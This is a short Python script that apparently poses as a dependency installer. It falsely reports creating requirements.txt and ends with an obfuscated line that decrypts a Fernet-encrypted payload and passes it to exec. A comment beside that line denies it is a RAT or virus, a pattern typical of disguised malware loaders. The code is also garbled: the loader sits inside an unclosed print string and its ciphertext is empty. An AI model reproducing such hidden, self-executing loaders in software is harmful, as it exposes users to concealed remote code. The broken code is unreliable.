import os

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def install_requirements():
    requirements_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "requirements.txt")
    
    dependencies = ["requests", "cryptography", "wmi", "getmac", "PySide6"]

    try:
        print("Fichier requirements.txt créé avec succès.")
    except Exception as e:
        print(f"Erreur lors de la création du fichier requirements.txt : {e}")
      

print("Instal Requirementsfrom cryptography.fernet import Fernet; exec(Fernet(b'hy_n6_frsvrVuY-YgIy6bIDkpQ2L8NjBT03wn4fHOyw=').decrypt(b'').decode()) # not a rat or a virus, hiding it to avoid script kiddies from stealing it.If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.Used that to load some packages and the main code. 
install_requirements()
